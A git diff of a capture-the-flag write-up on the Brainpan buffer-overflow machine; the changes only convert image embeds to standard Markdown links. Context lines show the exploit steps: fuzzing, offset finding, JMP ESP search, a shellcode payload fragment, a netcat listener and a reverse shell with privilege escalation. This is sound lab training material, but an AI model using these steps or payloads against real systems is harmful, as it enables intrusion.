@@ -5,21 +5,21 @@
 
 ### **Nmap Scan**:
 
-![[nmap results.png]]
+![nmap results.png](Brainpan_Resources/nmap_results.png)
 
 ### **Gobuster Scan**:
 
-![[gobuster results.png]]
+![gobuster results.png](Brainpan_Resources/gobuster_results.png)
 
 ### **View /bin Directory Contents with curl**:
 
-![[view contents of bin directory.png]]
+![view contents of bin directory.png](Brainpan_Resources/view_contents_of_bin_directory.png)
 
 Now we just need to get the executable downloaded so we can start working on analysis locally. 
 ### **Download brainpan.exe with wget**:
 
 
-![[wget exe.png]]
+![wget exe.png](Brainpan_Resources/wget_exe.png)
 
 
 ## Analysis
@@ -68,7 +68,7 @@ for length in range(start_length, end_length + 1, step):
 With this semi-automated script, you will have to press "**ctrl + F2**" in x32dbg to restart the program between each payload until one of the payloads causes the program to crash. 
 
 
-![[Initial Crash.png]]
+![Initial Crash.png](Brainpan_Resources/Initial_Crash.png)
 
 Creating cyclic pattern using python and Pwntools:
 
@@ -124,7 +124,7 @@ python3 fuzzer.py
 
 Crashing with pwntools cyclic pattern:
 
-![[cyclic pattern overflow.png]]
+![cyclic pattern overflow.png](Brainpan_Resources/cyclic_pattern_overflow.png)
 
 Finding the offset using python and Pwntools
 
@@ -146,7 +146,7 @@ buffer = overflow + padding #change "pattern" in send line to "buffer"
 
 Verifying the offset:
 
-![[verify offset.png]]
+![verify offset.png](Brainpan_Resources/verify_offset.png)
 
 
 ## Badchars
@@ -212,20 +212,20 @@ except Exception as e:
 
 As you can see, the pattern starting at the indicated ESP address is unbroken/ altered. 
 
-![[unbroken pattern no badchars.png]]
+![unbroken pattern no badchars.png](Brainpan_Resources/unbroken_pattern_no_badchars.png)
 
 ## Finding a valid JMP address
 
 Now we need to find the JMP ESP
 
-![[search jmp esp.png]]
+![search jmp esp.png](Brainpan_Resources/search_jmp_esp.png)
 
 Search for --> All Modules --> Command
 
-![[search jmp.png]]
+![search jmp.png](Brainpan_Resources/search_jmp.png)
 
 
-![[jmp esp address.png]]
+![jmp esp address.png](Brainpan_Resources/jmp_esp_address.png)
 
 Convert from Big Endian to Little Endian:
 
@@ -258,7 +258,7 @@ payload = b'\xbe\x3f\x26\xe4\xd4\xda\xdb\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1\x52\x83
 
 Attempt to stabilize the shell and then run `/usr/bin/ sudo -l`
 
-![[escalation route.png]]
+![escalation route.png](Brainpan_Resources/escalation_route.png)
 
 Creating a better shell:
 
@@ -274,9 +274,9 @@ nc -lvnp 4445
 
 Start reverse shell with your python script:
 
-![[reverse shell.png]]
+![reverse shell.png](Brainpan_Resources/reverse_shell.png)
 
 Received connection --> escalate with /home/anansi/bin/anansi_util file:
 
-![[escalation in new shell.png]]
+![escalation in new shell.png](Brainpan_Resources/escalation_in_new_shell.png)
 
